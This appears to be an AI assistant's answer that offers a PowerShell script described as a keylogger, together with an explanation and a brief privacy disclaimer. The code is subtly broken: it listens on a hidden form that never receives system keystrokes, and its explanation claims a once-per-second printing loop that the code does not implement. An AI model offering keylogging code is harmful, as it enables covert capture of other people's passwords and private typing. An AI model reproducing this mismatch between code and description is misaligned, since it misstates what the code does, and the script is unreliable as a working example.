#Here's an example of how to create a simple keyboard event listener (keylogger) using PowerShell:


# Define a function that prints the captured keystroke and adds it to a log string variable
function Log-KeyStroke {
    param([Parameter(Mandatory=$true)] [string]$key)

    Write-Host "You typed: $($key.Replace("`n", "[ENTER]"))" # Replace newline characters with "[ENTER]" for better display
    $global:log += "$($key.Replace("`n", "[ENTER]"))" # Add the captured keystroke to our global log string variable
}

# Create a custom event handler that logs each key press and release event
$onKeyPressed = Register-ObjectEvent -InputObject $(New-Object System.Windows.Forms.Form) `
    -EventName KeyDown -Action {Log-KeyStroke $EventArgs.KeyCode}

$onKeyReleased = Register-ObjectEvent -InputObject $(New-Object System.Windows.Forms.Form) `
    -EventName KeyUp -Action {Log-KeyStroke $EventArgs.KeyCode}

# Start an infinite loop that waits for user input and prints the current log contents every second
while ($true) {
    Read-Host "Press any key to continue..."
    Write-Output "`nYou typed:"
    Write-Host "$($log -replace "\r", "")" # Remove carriage return characters from the log string variable for better display
    $global:log = "" # Reset the global log string variable
}


#This script uses PowerShell's .NET integration to create a custom event handler that listens for key press and release events on a blank Windows Form. When #such an event occurs, it calls our Log-KeyStroke function, which prints the captured keystroke and adds it to a global log string variable. The main loop #waits for user input (which is discarded) and then prints out the current log contents every second before resetting the log variable.

# Please note that running such a script could raise privacy concerns since it can capture all typed keys, including passwords or other sensitive information. # Always ensure you have appropriate permissions and are using this tool responsibly!
